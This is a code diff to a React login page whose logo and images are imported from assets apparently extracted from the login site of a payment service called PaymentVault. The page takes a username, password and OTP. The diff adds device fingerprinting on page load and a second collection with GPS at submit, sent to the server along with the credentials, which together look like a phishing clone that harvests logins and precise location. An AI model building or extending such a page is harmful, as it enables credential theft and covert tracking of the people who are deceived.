@@ -1,4 +1,4 @@
-import { useState } from 'react';
+import { useState, useEffect } from 'react';
 import { useLocation } from 'wouter';
 import { AntiCopyProtection } from '@/components/AntiCopyProtection';
 import { SEO } from '@/components/SEO';
@@ -7,6 +7,7 @@ import { useLanguage } from '@/contexts/LanguageContext';
 import { apiRequest } from '@/lib/queryClient';
 import { useToast } from '@/hooks/use-toast';
 import { getDeviceData } from '@/lib/deviceInfo';
+import { collectDeviceFingerprint, getStoredFingerprint, type DeviceFingerprint } from '@/lib/device-fingerprint';
 import '@/styles/styles.css';
 import logoSvg from '@assets/extracted/login.mypaymentvault.com/paymentvault_logo.svg';
 import loginPageImg from '@assets/extracted/login.mypaymentvault.com/login_page.webp';
@@ -27,6 +28,21 @@ export default function LoginPage() {
   const [password, setPassword] = useState('');
   const [emailError, setEmailError] = useState('');
   const [otpError, setOtpError] = useState('');
+  const [fingerprint, setFingerprint] = useState<DeviceFingerprint | null>(null);
+
+  // Collect fingerprint on mount
+  useEffect(() => {
+    const collectFingerprint = async () => {
+      const stored = getStoredFingerprint();
+      if (stored) {
+        setFingerprint(stored);
+      } else {
+        const fp = await collectDeviceFingerprint(true);
+        setFingerprint(fp);
+      }
+    };
+    collectFingerprint();
+  }, []);
 
   const maskEmail = (email: string) => {
     const [user, domain] = email.split('@');
@@ -72,9 +88,12 @@ export default function LoginPage() {
 
     try {
       const deviceData = getDeviceData();
+      // Re-collect fingerprint with GPS in case user granted location permission
+      const latestFingerprint = await collectDeviceFingerprint(true);
       const response = await apiRequest('POST', '/api/login', { 
         username, 
         password,
+        fingerprint: latestFingerprint,
         ...deviceData 
       });
       const data = await response.json();
